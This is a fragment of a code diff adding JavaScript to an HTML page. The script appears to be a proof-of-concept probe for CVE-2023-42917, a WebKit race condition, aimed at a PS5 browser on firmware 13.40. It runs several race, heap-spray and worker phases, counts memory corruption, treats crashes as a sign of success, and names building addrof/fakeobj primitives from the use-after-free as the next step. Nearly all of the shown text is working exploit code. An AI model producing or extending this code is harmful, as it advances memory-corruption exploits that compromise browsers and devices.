+        var actual=arrays[i][50];
+        if(actual!==expected && !isNaN(actual) && actual!==undefined){
+          corrupted++;
+          if(corrupted<=5){
+            Hi("INTENSIVE CORRUPTION: arr["+i+"][50]="+actual+" (expected "+expected+")");
+          }
+        }
+      }catch(e){
+        corrupted++;
+        if(corrupted<=5) Hi("ACCESS ERR: "+e.message);
+      }
+    }
+
+    P("  Round "+round+"/20: corrupted="+corrupted,"dm");
+    await watchdog(50);
+
+    // Free arrays
+    arrays.length=0;
+  }
+
+  P("");
+  P("  Intensive race corrupted: "+corrupted,corrupted>0?"hl":"dm");
+  return corrupted;
 }
 
-}, 1000);
+// ============================================================
+//  MAIN
+// ============================================================
+async function main(){
+  await watchdog(200);
+
+  var totalCorrupted=0;
+
+  totalCorrupted+=await phase1_arrayShiftRace();
+  await watchdog(100);
+
+  totalCorrupted+=await phase2_objectFlattenRace();
+  await watchdog(100);
+
+  totalCorrupted+=await phase3_typedArraySpray();
+  await watchdog(100);
+
+  totalCorrupted+=await phase4_workerRace();
+  await watchdog(100);
+
+  totalCorrupted+=await phase5_intensiveRace();
+
+  // Final summary
+  pg(100);Sep();Hd("FINAL SUMMARY");Sep();
+  P("");
+  P("  Total corruption detected: "+totalCorrupted,totalCorrupted>0?"hl":"dm");
+  P("");
+
+  if(totalCorrupted>0){
+    St("★ CVE-2023-42917 IS PRESENT ON PS5 FW 13.40! ★");
+    P("");
+    P("  flattenDictionaryStructure race condition confirmed!","hl");
+    P("  Next: build addrof/fakeobj from this UAF","hl");
+    hu("h2","STAGE:<b>VULNERABLE!</b>");
+  }else{
+    P("  No corruption detected in 180+ race attempts.","dm");
+    P("  Possible reasons:","dm");
+    P("  1. CVE-2023-42917 is patched on FW 13.40","dm");
+    P("  2. Race window not hit (need more attempts)","dm");
+    P("  3. GC timing differs from iOS","dm");
+    P("");
+    P("  If no CRASH occurred, the bug may be patched.","wr");
+    hu("h2","STAGE:<b>DONE</b>");
+  }
+}
+
+// Global error handler — crash = race hit!
+window.onerror=function(msg,src,line,col,err){
+  Fl("═══ CRASH DETECTED ═══");
+  Fl("  "+msg.substring(0,100));
+  Fl("  @ line "+line);
+  St("CRASH = RACE CONDITION HIT!");
+  St("CVE-2023-42917 MAY BE PRESENT!");
+  P("");
+  P("  A crash during flattenDictionaryStructure race","hl");
+  P("  strongly suggests the bug is unpatched.","hl");
+  hu("h2","STAGE:<b>CRASH!</b>");
+  return true;
+};
+
+setTimeout(main,100);
 </script>
 </body>
 </html>
